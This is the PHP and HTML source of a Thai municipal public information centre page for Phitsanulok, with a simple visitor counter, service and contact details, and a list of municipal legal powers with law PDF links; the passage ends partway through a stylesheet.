<?php
// ตั้งค่าโซนเวลาเป็นประเทศไทย
date_default_timezone_set('Asia/Bangkok');
require_once 'db.php';

// เก็บข้อมูลวันที่และเวลาปัจจุบัน
$date = date('Y-m-d');
$time = date('H:i:s');
$month = date('m');
$year = date('Y');

// เก็บ IP ของผู้เยี่ยมชม
$ip_address = $_SERVER['REMOTE_ADDR'];

// ตรวจสอบว่ามีการเข้าชมจาก IP นี้ในวันนี้แล้วหรือไม่
$stmt = $conn->prepare("SELECT * FROM visitors WHERE visit_date = ? AND ip_address = ?");
if (!$stmt) {
    die("Prepare failed: " . $conn->error);
}
$stmt->bind_param("ss", $date, $ip_address);
$stmt->execute();
$result = $stmt->get_result();
$visitor = $result ? $result->fetch_assoc() : null;
$stmt->close();

if ($visitor) {
    $stmt = $conn->prepare("UPDATE visitors SET count = count + 1, visit_time = ? WHERE visit_date = ? AND ip_address = ?");
    if (!$stmt) {
        die("Prepare failed: " . $conn->error);
    }
    $stmt->bind_param("sss", $time, $date, $ip_address);
    $stmt->execute();
    $stmt->close();
} else {
    $stmt = $conn->prepare("INSERT INTO visitors (visit_date, visit_month, visit_year, visit_time, ip_address, count) VALUES (?, ?, ?, ?, ?, 1)");
    if (!$stmt) {
        die("Prepare failed: " . $conn->error);
    }
    $stmt->bind_param("sssss", $date, $month, $year, $time, $ip_address);
    $stmt->execute();
    $stmt->close();
}
?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- เปลี่ยนฟอนต์เป็น Sarabun และ Prompt -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;700&family=Prompt:wght@300;400;600;700&display=swap" rel="stylesheet">
    <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome สำหรับโซเชียล -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <!-- Favicon -->
    <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <!-- Bootstrap JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
    <meta name="รายละเอียด" content="">
    <meta name="ผู้จัดทำ" content="">
    <!-- CSS FILES -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/bootstrap-icons.css" rel="stylesheet">
    <link href="css/templatemo-ebook-landing.css" rel="stylesheet">
    <link href="css/styles.css" rel="stylesheet">
    <!-- CSS สำหรับฟอนต์ใหม่ -->
    <style>
        /* ใช้ Sarabun สำหรับเนื้อหาทั่วไป */
        body, p, a, li, span, div, input, select, button, .nav-link, .carousel-item, .news-content, .footer-content {
            font-family: 'Sarabun', sans-serif;
            font-weight: 400;
            line-height: 1.6;
        }
        /* ใช้ Prompt สำหรับหัวข้อและส่วนที่เน้น */
        h1, h2, h3, h4, h5, h6, .navbar-brand, .btn, .blockquote, .news-item h5 {
            font-family: 'Prompt', sans-serif;
            font-weight: 600;
        }
        h1.text-white.mb-4 {
        margin-top: 16rem;
        font-size: 3.6rem;
        }
       .P {
            font-size: 18.5px;
        }
        /* ปรับฟอนต์สำหรับ Carousel และ Footer */
        .carousel-indicators button, .carousel-control-prev, .carousel-control-next, .footer p, .footer a {
            font-family: 'Sarabun', sans-serif;
            font-weight: 400;
        }
        /* รักษาการจัดตำแหน่ง */
        .text-justify {
            text-align: justify;
        }
        /* ปรับขนาดฟอนต์สำหรับหน้าจอเล็ก */
        @media (max-width: 768px) {
            body, p, a, li, span, div {
                font-size: 0.95rem;
            }
            h1 { font-size: 2rem; }
            h2 { font-size: 1.75rem; }
            h3, h4, h5, h6 { font-size: 1.25rem; }
        }
          /* CSS สำหรับ blockquote */
          .blockquote {
            padding: 20px;
            background: #f8f9fa;
            border-left: 5px solid #007bff;
            border-radius: 5px;
            margin: 20px 0;
        }
        .blockquote h5 {
            font-family: 'Prompt', sans-serif;
            font-weight: 600;
            font-size: 1.25rem;
            margin-bottom: 15px;
            color: #333;
        }
        .blockquote .law-item {
            margin-bottom: 15px;
            padding-left: 15px;
            border-left: 2px solid #dee2e6;
        }
        .blockquote .law-item p {
            font-family: 'Sarabun', sans-serif;
            font-weight: 400;
            font-size: 1rem;
            margin: 0 0 5px 0;
            color: #555;
        }
        .blockquote .law-item a {
            font-family: 'Sarabun', sans-serif;
            font-weight: 400;
            font-size: 0.95rem;
            color: #007bff;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
        }
        .blockquote .law-item a:hover {
            text-decoration: underline;
            color: #0056b3;
        }
        .blockquote .law-item a::before {
            content: '\f1c1'; /* FontAwesome PDF icon */
            font-family: 'Font Awesome 5 Free';
            font-weight: 900;
            margin-right: 5px;
            color: #dc3545;
        }
        /* ปรับระยะห่างสำหรับหน้าจอเล็ก */
        @media (max-width: 768px) {
            .blockquote {
                padding: 15px;
            }
            .blockquote h5 {
                font-size: 1.1rem;
            }
            .blockquote .law-item p {
                font-size: 0.9rem;
            }
            .blockquote .law-item a {
                font-size: 0.85rem;
            }
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg hero-navbar">
        <div class="container">
            <a class="navbar-brand" href="https://phsmun.go.th">
                <i class="navbar-brand-icon bi-book me-2"></i>
                <span>E-book</span>
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-lg-auto me-lg-4">
                    <li class="nav-item">
                        <a class="nav-link click-scroll" href="#section_1">หน้าหลัก</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link click-scroll" href="#section_2">แนะนำศูนย์ข้อมูล</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link click-scroll" href="#section_3">ข่าวประชาสัมพันธ์</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" style="text-decoration:none" href="e-Book.php" target="_blank">ตารางการค้นหาหนังสือ</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link click-scroll" href="#section_5">ช่องทางการให้บริการ</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <section class="hero-section d-flex justify-content-center align-items-center" id="section_1">
        <video autoplay muted loop class="hero-video">
            <source src="video/phsmun.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-12 mb-5 pb-5 pb-lg-0 mb-lg-0">
                    <h1 class="text-white mb-4">ศูนย์ข้อมูลข่าวสารเทศบาลนครพิษณุโลก</h1>
                    <a href="#section_2" class="btn custom-btn smoothscroll me-3">ความสำคัญของห้องศูนย์ข้อมูล</a>
                    <a href="#section_3" class="link link--kale smoothscroll">ข่าวประชาสัมพันธ์</a>
                </div>
            </div>
        </div>
    </section>

    <section class="featured-section">
        <div class="container">
            <div class="row"></div>
        </div>
    </section>

    <section class="py-lg-5"></section>

    <section class="book-section section-padding" id="section_2">
        <div class="container">
            <div class="row">
                <div class="col-lg-5 col-12">
                    <div id="videoContent4" class="video-container">
                        <iframe 
                            src="https://www.youtube.com/embed/-AFQr0ujlWg?start=10"
                            title="YouTube video player" 
                            frameborder="0"
                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                            allowfullscreen></iframe>
                    </div>
                </div>
                <div class="col-lg-7 col-12">
                    <div class="book-section-info">
                        <h2 class="mb-4">แนะนำศูนย์ข้อมูล</h2>
                        <p class="text-justify">ทำความรู้จักกับศูนย์ข้อมูลข่าวสารตามพระราชบัญญัติข้อมูลข่าวสารของราชการ พ.ศ.2540 <a rel="nofollow" href="https://web.parliament.go.th/assets/portals/79/filenewspar/79_467_file.pdf" target="_blank">(พ.ร.บ.)</a> กำหนดให้หน่วยงานของรัฐต้องจัดให้มีข้อมูลข่าวสารอย่างน้อยตามที่กฎหมายกำหนดไว้เพื่อให้ประชาชนสามารถเข้าตรวจสอบได้ โดยข้อมูลข่าวสารนี้จะต้องจัดเตรียมและจัดเก็บ ณ ที่ทำการของหน่วยงานที่เรียกว่าศูนย์ข้อมูลข่าวสารเพื่ออำนวยความสะดวกในการเข้าถึงข้อมูลของประชาชน</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section>
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-12 text-center">
                    <h6>ทำไมถึงต้องมีหนังสืออิเล็กทรอนิกส์?</h6>
                    <h2 class="mb-5">ทำความเข้าใจกับหนังสืออิเล็กทรอนิกส์</h2>
                </div>
                <div class="col-lg-4 col-12">
                    <nav id="navbar-example3" class="h-100 flex-column align-items-stretch">
                        <nav class="nav nav-pills flex-column">
                            <a class="nav-link smoothscroll" href="#item-1">หนังสืออิเล็กทรอนิกส์คืออะไร ? </a>
                            <a class="nav-link smoothscroll" href="#item-2">1: <strong>ห้องศูนย์ข้อมูลข่าวสาร</strong></a>
                            <a class="nav-link smoothscroll" href="#item-3">2: <strong>มุมอ่านหนังสือ</strong></a>
                            <a class="nav-link smoothscroll" href="#item-4">3: <strong>การให้บริการ</strong></a>
                            <a class="nav-link smoothscroll" href="#item-5">4: <strong>โครงสร้างองค์กร</strong></a>
                            <a class="nav-link smoothscroll" href="#item-6">5: <strong>บทบาทหน้าที่</strong></a>
                            <a class="nav-link smoothscroll" href="#item-7">6: <strong>ยุทธศาสตร์และแผนงาน</strong></a>
                        </nav>
                    </nav>
                </div>
                <div class="col-lg-8 col-12">
                    <div data-bs-spy="scroll" data-bs-target="#navbar-example3" data-bs-smooth-scroll="true"
                        class="scrollspy-example-2" tabindex="0">
                        <div class="scrollspy-example-item" id="item-1">
                            <h5>หนังสืออิเล็กทรอนิกส์คืออะไร ? </h5>
                            <p class="text-justify"> หนังสือเล่ม: อยู่ในรูปแบบสิ่งพิมพ์ กระดาษที่สามารถจับต้องได้จริง และต้องใช้พื้นที่ในการจัดเก็บ </p>
                            <p class="text-justify"> หนังสืออิเล็กทรอนิกส์ หรือ E-book: เป็นหนังสือที่อยู่ในรูปแบบดิจิทัล สามารถอ่านได้บนอุปกรณ์อิเล็กทรอนิกส์ เช่น คอมพิวเตอร์ แท็บเล็ต สมาร์ทโฟน หรือเครื่องอ่านหนังสือเฉพาะ (E-reader) หนังสืออิเล็กทรอนิกส์มีเนื้อหาคล้ายกับหนังสือเล่มปกติ แต่จะนำเสนอในรูปแบบที่อ่านง่ายบนหน้าจอ</p>
                            <img src="images/Post.png" class="img-fluid d-block mx-auto" alt="Post">
                            <blockquote class="blockquote">หนังสืออิเล็กทรอนิกส์มีข้อดีหลายประการ เช่น พกพาสะดวก ประหยัดพื้นที่จัดเก็บ และยังช่วยลดการใช้กระดาษ ทำให้เป็นทางเลือกที่ดีสำหรับผู้ที่ชื่นชอบการอ่านและสนใจรักษาสิ่งแวดล้อม</blockquote>
                        </div>
                        <div class="scrollspy-example-item" id="item-2">
                            <h5>ห้องศูนย์ข้อมูลข่าวสาร</h5>
                            <p class="text-justify"> ภายในห้องศูนย์ข้อมูลข่าวสารนี้จะมีเอกสารและข้อมูลที่เกี่ยวข้องกับการทำงานของหน่วยงานนั้นๆ ตามที่กฎหมายกำหนด เช่น ข้อมูลเกี่ยวกับงบประมาณ แผนงาน ผลการดำเนินงาน กฎระเบียบต่างๆ เป็นต้น เพื่อส่งเสริมความโปร่งใสและให้ประชาชนมีส่วนร่วมในการตรวจสอบข้อมูลของทางราชการ</p>
                            <div class="row">
                                <div class="col-lg-6 col-12 mb-3">
                                    <img src="images/portrait-mature-smiling-authoress-sitting-desk.jpg"
                                        class="scrollspy-example-item-image img-fluid" alt="">
                                </div>
                                <div class="col-lg-6 col-12 mb-3">
                                    <img src="images/businessman-sitting-by-table-cafe.jpg"
                                        class="scrollspy-example-item-image img-fluid" alt="">
                                </div>
                            </div>
                            <p>การจัดวางที่เป็นระเบียบทำให้การค้นหาข้อมูลได้ง่ายและสะดวกต่อผู้ที่เข้ามาใช้บริการ</p>
                        </div>
                        <div class="scrollspy-example-item" id="item-3">
                            <h5>มุมอ่านหนังสือ</h5>
                            <p class="text-justify"> เป็นพื้นที่ที่จัดไว้ในห้องศูนย์ข้อมูลข่าวสารของหน่วยงานรัฐเพื่อให้ประชาชนสามารถนั่งอ่านเอกสารและข้อมูลต่างๆที่จัดเตรียมไว้ได้อย่างสะดวก มุมนี้จะมีการจัดโต๊ะ เก้าอี้และสิ่งอำนวยความสะดวกอื่นๆ ที่ช่วยให้ผู้เข้ามาใช้งานสามารถอ่านและศึกษาข้อมูลได้อย่างมีสมาธิและสะดวกสบาย</p>
                            <div class="row align-items-center">
                                <div class="col-lg-6 col-12">
                                    <img src="images/S__14655500.jpg" class="img-fluid" alt="">
                                </div>
                                <div class="col-lg-6 col-12">
                                    <p><strong>จัดให้มีพื้นที่เงียบสงบเหมาะสำหรับการอ่านและศึกษาข้อมูล ทำให้ผู้ใช้บริการสามารถอ่านได้อย่างมีสมาธิ.</strong></p>
                                </div>
                            </div>
                        </div>
                        <div class="scrollspy-example-item" id="item-4">
                            <h5>การให้บริการ</h5>
                            <p>ศูนย์ข้อมูลข่าวสารเทศบาลนครพิษณุโลก ตั้งอยู่ที่ ถ.บรมไตรโลกนารถ 2 ต.ในเมือง อ.เมือง จ.พิษณุโลก 65000 ชั้น 1 ติดต่อสอบถามได้ตามวันและเวลาราชการครับ/ค่ะ</p>
                            <p>
                                กองยุทธศาสตร์และงบประมาณ
                                ฝ่ายบริการและเผยแพร่วิชาการ
                                โทร 0-5598-3221-28 ต่อ 307
                                ช่องทางโทรสาร 0-5598-3202
                                หรือทางเว็บไซต์ www.phsmun.go.th</p>
                            <img src="images/789456.png"
                                class="scrollspy-example-item-image img-fluid mb-3" alt="">
                        </div>
                        <div class="scrollspy-example-item" id="item-5">
                            <h5>โครงสร้างองค์กร</h5>
                            <p class="text-justify">ขนาดและที่ตั้งเทศบาลนครพิษณุโลกเป็นองค์กรปกครองส่วนท้องถิ่นขนาดใหญ่ตั้งอยู่ในเขตอำเภอเมืองพิษณุโลก จังหวัดพิษณุโลก มีพื้นที่ 18.26 ตารางกิโลเมตร ตั้งอยู่ในบริเวณภาคเหนือตอนล่างของประเทศไทย ตามแนวละติจูดที่ 16 องศาเหนือ 16 ลิปดาตะวันออก ห่างจากรุงเทพมหานคร ไปทางทิศเหนือประมาณ 377 กิโลเมตร มีอาณาเขตติดต่อกับพื้นที่ใกล้เคียง ดังนี้ ทิศเหนือติดต่อกับเทศบาลตำบลหัวรอและเทศบาลเมืองอรัญญิก ทิศใต้ติดต่อกับเทศบาลตำบลท่าทองและองค์การบริหารส่วนตำบลบึงพระ ทิศตะวันออกติดต่อกับเทศบาลเมืองอรัญญิก ทิศตะวันตกติดต่อกับเทศบาลตำบลบ้านคลองและองค์การบริหารส่วนตำบลวัดจันทร์ </p>
                                     <section class="mb-3">
                        <h6 class="fw-bold">ข้อมูลประชากร</h6>
                        <p>
                            ประชากรตามทะเบียนราษฎร จำนวนทั้งสิ้น <strong>63,882 คน</strong><br>
                            ชาย 28,916 คน | หญิง 34,966 คน<br>
                            จำนวนครัวเรือน 36,974 ครัวเรือน<br>
                            <small>(ข้อมูล ณ วันที่ 30 กันยายน 2564)</small>
                        </p>
                    </section>      
                            <blockquote class="blockquote">โครงสร้างผู้บริหารและโครงสร้างสภาเทศบาลนครพิษณุโลก<a rel="nofollow" href="https://phsmun.go.th/organization" target="_blank">(คลิกเพื่อดูโครงสร้างองค์กร)</a></blockquote>
                        </div>  
                         <!-- ข้อมูลประชากร -->
 
          <div class="scrollspy-example-item" id="item-6">
<h5 class="mb-4 border-bottom pb-2">
    อำนาจหน้าที่
</h5>

<!-- กฎหมายที่ 1 -->
<div class="card shadow-sm mb-4">
    <div class="card-header bg-light fw-bold">
        พระราชบัญญัติกำหนดแผนและขั้นตอนการกระจายอำนาจให้แก่องค์กรปกครองส่วนท้องถิ่น  
        พ.ศ. 2542 แก้ไขเพิ่มเติม (ฉบับที่ 2) พ.ศ. 2549
    </div>
    <div class="card-body">
        <ol class="ps-4 lh-lg">
            <li>การจัดทำแผนพัฒนาท้องถิ่นของตนเอง</li>
            <li>การจัดให้มีและบำรุงรักษาทางบก ทางน้ำ และทางระบายน้ำ</li>
            <li>การจัดให้มีและควบคุมตลาด ท่าเทียบเรือ ท่าข้าม และที่จอดรถ</li>
            <li>การสาธารณูปโภคและการก่อสร้างอื่นๆ</li>
            <li>การสาธารณูปการ</li>
            <li>การส่งเสริม การฝึก และประกอบอาชีพ</li>
            <li>การพาณิชย์ และการส่งเสริมการลงทุน</li>
            <li>การส่งเสริมการท่องเที่ยว</li>
            <li>การจัดการศึกษา</li>
            <li>การสังคมสงเคราะห์ และการพัฒนาคุณภาพชีวิตเด็ก สตรี คนชรา และผู้ด้อยโอกาส</li>
            <li>การบำรุงรักษาศิลปะ จารีตประเพณี ภูมิปัญญาท้องถิ่น และวัฒนธรรมอันดีของท้องถิ่น</li>
            <li>การปรับปรุงแหล่งชุมชนแออัดและการจัดการเกี่ยวกับที่อยู่อาศัย</li>
            <li>การจัดให้มีและบำรุงรักษาสถานที่พักผ่อนหย่อนใจ</li>
            <li>การส่งเสริมกีฬา</li>
            <li>การส่งเสริมประชาธิปไตย ความเสมอภาค และสิทธิเสรีภาพของประชาชน</li>
            <li>การส่งเสริมการมีส่วนร่วมของราษฎรในการพัฒนาท้องถิ่น</li>
            <li>การรักษาความสะอาดและความเป็นระเบียบเรียบร้อยของบ้านเมือง</li>
            <li>การกำจัดมูลฝอย สิ่งปฏิกูล และน้ำเสีย</li>
            <li>การสาธารณสุข การอนามัยครอบครัว และการรักษาพยาบาล</li>
            <li>การจัดให้มีและควบคุมสุสานและฌาปนสถาน</li>
            <li>การควบคุมการเลี้ยงสัตว์</li>
            <li>การจัดให้มีและควบคุมการฆ่าสัตว์</li>
            <li>การรักษาความปลอดภัยและการอนามัยในสถานสาธารณะ</li>
            <li>การจัดการทรัพยากรธรรมชาติและสิ่งแวดล้อม</li>
            <li>การผังเมือง</li>
            <li>การขนส่งและวิศวกรรมจราจร</li>
            <li>การดูแลรักษาที่สาธารณะ</li>
            <li>การควบคุมอาคาร</li>
            <li>การป้องกันและบรรเทาสาธารณภัย</li>
            <li>การรักษาความสงบเรียบร้อยและความปลอดภัยในชีวิตและทรัพย์สิน</li>
            <li>กิจการอื่นใดเพื่อประโยชน์ของประชาชนตามที่กฎหมายกำหนด</li>
        </ol>
    </div>
</div>

<!-- กฎหมายที่ 2 -->
<div class="card shadow-sm mb-4">
    <div class="card-header bg-light fw-bold">
        พระราชบัญญัติเทศบาล พ.ศ. 2496  
        แก้ไขเพิ่มเติมถึง (ฉบับที่ 14) พ.ศ. 2562
    </div>
    <div class="card-body">
        <ol class="ps-4 lh-lg">
            <li>รักษาความสงบเรียบร้อยของประชาชน</li>
            <li>ดูแลความเป็นระเบียบเรียบร้อยและการจราจร</li>
            <li>ให้มีและบำรุงทางบกและทางน้ำ</li>
            <li>รักษาความสะอาดและกำจัดมูลฝอย สิ่งปฏิกูล</li>
            <li>ป้องกันและระงับโรคติดต่อ</li>
            <li>จัดให้มีเครื่องดับเพลิง</li>
            <li>ส่งเสริมและสนับสนุนการศึกษา ศาสนา และการฝึกอบรม</li>
            <li>ส่งเสริมการพัฒนาสตรี เด็ก เยาวชน ผู้สูงอายุ และผู้พิการ</li>
            <li>บำรุงศิลปะ วัฒนธรรม และภูมิปัญญาท้องถิ่น</li>
            <li>จัดให้มีน้ำสะอาดหรือการประปา</li>
            <li>จัดให้มีโรงฆ่าสัตว์</li>
            <li>จัดให้มีสถานพยาบาล</li>
            <li>จัดให้มีและบำรุงทางระบายน้ำ</li>
            <li>จัดให้มีส้วมสาธารณะ</li>
            <li>จัดให้มีไฟฟ้าหรือแสงสว่าง</li>
            <li>ดำเนินกิจการโรงรับจำนำ</li>
            <li>จัดระเบียบการจราจร</li>
            <li>สงเคราะห์มารดาและเด็ก</li>
            <li>กิจการด้านสาธารณสุขอื่นที่จำเป็น</li>
            <li>ควบคุมสุขลักษณะในสถานบริการ</li>
            <li>จัดการเกี่ยวกับที่อยู่อาศัยและแหล่งเสื่อมโทรม</li>
            <li>จัดให้มีและควบคุมตลาดและที่จอดรถ</li>
            <li>การวางผังเมืองและควบคุมอาคาร</li>
            <li>ส่งเสริมการท่องเที่ยว</li>
            <li>หน้าที่อื่นตามที่กฎหมายกำหนด</li>
        </ol>
    </div>
</div>

 

    <blockquote class="blockquote">
        โครงสร้างผู้บริหารและโครงสร้างสภาเทศบาลนครพิษณุโลก
        <a href="https://phsmun.go.th/organization" target="_blank" rel="nofollow">
            (คลิกเพื่อดูโครงสร้างองค์กร)
        </a>
    </blockquote>
</div>

                            <blockquote class="blockquote">
                                <h5>กฎหมายเกี่ยวกับการกระจายอำนาจให้แก่องค์กรปกครองส่วนท้องถิ่น</h5>
                                <div class="law-item">
                                    <p>พระราชบัญญัติกำหนดแผนและขั้นตอนการกระจายอำนาจให้แก่ อปท. พ.ศ. 2542</p>
                                    <a href="pdf/พระราชบัญญัติกำหนดแผนและขั้นตอนการกระจายอำนาจให้แก่องค์กรปกครองส่วนท้องถิ่น พ.ศ.2542.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>

                                <h5>ระเบียบข้าราชการท้องถิ่น</h5>
                                <div class="law-item">
                                    <p>พระราชบัญญัติระเบียบข้าราชการกรุงเทพมหานครและบุคลากรกรุงเทพมหานคร พ.ศ. 2554</p>
                                    <a href="pdf/พระราชบัญญัติระเบียบข้าราชการกรุงเทพมหานครและบุคลากรกรุงเทพมหานคร พ.ศ. 2554.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติระเบียบบริหารงานบุคคลส่วนท้องถิ่น พ.ศ. 2542</p>
                                    <a href="pdf/พระราชบัญญัติระเบียบบริหารงานบุคคลส่วนท้องถิ่น พ.ศ.2542.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>

                                <h5>การจัดตั้ง</h5>
                                <div class="law-item">
                                    <p>พระราชบัญญัติเทศบาล พ.ศ. 2496</p>
                                    <a href="pdf/พระราชบัญญัติเทศบาล พ.ศ.2496.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติระเบียบบริหารราชการกรุงเทพมหานคร พ.ศ. 2528</p>
                                    <a href="pdf/พระราชบัญญัติระเบียบบริหารราชการกรุงเทพมหานคร พ.ศ.2528.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติระเบียบบริหารราชการเมืองพัทยา พ.ศ. 2542</p>
                                    <a href="pdf/พระราชบัญญัติระเบียบบริหารราชการเมืองพัทยา พ.ศ.2542.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติสภาตำบลและองค์การบริหารส่วนตำบล พ.ศ. 2537</p>
                                    <a href="pdf/พระราชบัญญัติสภาตำบลและองค์การบริหารส่วนตำบล พ.ศ.2537.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติองค์การบริหารส่วนจังหวัด พ.ศ. 2540</p>
                                    <a href="pdf/พระราชบัญญัติองค์การบริหารส่วนจังหวัด พ.ศ.2540.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>

                                <h5>ด้านอื่นๆ</h5>
                                <div class="law-item">
                                    <p>พระราชบัญญัติการเลือกตั้งสมาชิกหรือผู้บริหารท้องถิ่น พ.ศ. 2545</p>
                                    <a href="pdf/พระราชบัญญัติการเลือกตั้งสมาชิกหรือผู้บริหารท้องถิ่น พ.ศ.2545.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติเครื่องแบบเจ้าหน้าที่ส่วนท้องถิ่น พ.ศ. 2509</p>
                                    <a href="pdf/พระราชบัญญัติเครื่องแบบเจ้าหน้าที่ส่วนท้องถิ่น พ.ศ.2509.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติเครื่องแบบและบัตรประจำตัวเจ้าหน้าที่กรุงเทพมหานคร พ.ศ. 2530</p>
                                    <a href="pdf/พระราชบัญญัติเครื่องแบบและบัตรประจำตัวเจ้าหน้าที่กรุงเทพมหานคร พ.ศ. 2530.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติบำเหน็จบำนาญข้าราชการส่วนท้องถิ่น พ.ศ. 2500</p>
                                    <a href="pdf/พระราชบัญญัติบำเหน็จบำนาญข้าราชการส่วนท้องถิ่น พ.ศ.2500.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติว่าด้วยการลงคะแนนเสียงเพื่อถอดถอนสมาชิกสภาท้องถิ่นหรือผู้บริหารท้องถิ่น พ.ศ. 2542</p>
                                    <a href="pdf/พระราชบัญญัติว่าด้วยการลงคะแนน พ.ศ.2542.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                                <div class="law-item">
                                    <p>พระราชบัญญัติว่าด้วยเข้าชื่อเสนอข้อบัญญัติท้องถิ่น พ.ศ. 2542</p>
                                    <a href="pdf/พระราชบัญญัติว่าด้วยเข้าชื่อเสนอข้อบัญญัติท้องถิ่น พ.ศ.2542.pdf" target="_blank">
                                        คลิกเพื่อเปิดไฟล์ PDF
                                    </a>
                                </div>
                            </blockquote>                
                        </div>
                        <div class="scrollspy-example-item" id="item-7">
                            <h5>ยุทธศาสตร์และแผนงาน</h5>
                            <p class="text-justify"> ประกอบด้วยแผนยุทธศาสตร์,แผนพัฒนาท้องถิ่น,แผนการดำเนินงาน,ติดตามและประเมินผลแผนพัฒนา,แผนการบริหารจัดการความเสี่ยง,งบประมาณรายจ่าย,แผนอัตรากำลัง3ปี,แผนปฏิบัติการป้องกันการทุจริต,เทศบัญญัติรายจ่ายประจำปี,ติดตามประเมินผล,รายงานผลต่างๆ  </p>      
                            <blockquote class="blockquote">
                                หนังสืออิเล็กทรอนิกส์และเอกสารที่เกี่ยวกับยุทธศาสตร์และแผนงาน
                                <a rel="nofollow" href="https://phsmun.go.th/plans" target="_blank">
                                    (คลิกเพื่อดาวน์โหลดหนังสืออิเล็กทรอนิกส์ยุทธศาสตร์และแผนงาน)
                                </a>
                            </blockquote>
                        </div>
                        <div class="container news-section">
                            <h4 class="text-center mb-4">ประกาศผลการพิจารณาจัดซื้อจัดจ้าง</h4>
                            <div class="row">
                                <div class="col-lg-6 col-md-6 mb-6">
                                    <a href="https://phsmun.go.th/news/?cid=22" class="news-link" target="_blank">
                                        <div class="news-item">
                                            <img src="images/ประกาศ.png" alt="News Image 1" class="img-fluid">
                                            <div class="news-content">
                                                <h5>ประกาศ</h5>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                                <div class="col-lg-6 col-md-6 mb-6">
                                    <a href="https://phsmun.go.th/news/?cid=3" class="news-link" target="_blank">
                                        <div class="news-item">
                                            <img src="images/ข่าวจัด.png" alt="News Image 2" class="img-fluid">
                                            <div class="news-content">
                                                <h5>ข่าวจัดซื้อจัดจ้าง</h5>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <style>
        /* Section Padding */
        .section-padding { padding: 60px 0; }
        /* Carousel Container */
        .carousel-container { max-width: 100%; margin: 0 auto; }
        /* Carousel Images */
        .carousel-img { max-height: 500px; width: auto; object-fit: contain; transition: transform 0.3s ease, box-shadow 0.3s ease; border-radius: 10px; }
        /* Hover Effect */
        .carousel-item a:hover .carousel-img { transform: scale(1.05); box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2); }
        /* Carousel Controls */
        .carousel-control-prev, .carousel-control-next { width: 5%; background: rgba(0, 0, 0, 0.3); transition: background 0.3s ease; }
        .carousel-control-prev:hover, .carousel-control-next:hover { background: rgba(0, 0, 0, 0.5); }
        /* Carousel Indicators */
        .carousel-indicators [data-bs-target] { background-color: #007bff; width: 12px; height: 12px; border-radius: 50%; margin: 0 6px; }
        .carousel-indicators .active { background-color: #0056b3; }
        /* Responsive Adjustments */
        @media (max-width: 768px) {
          .carousel-img { max-height: 300px; }
          .section-padding { padding: 40px 0; }
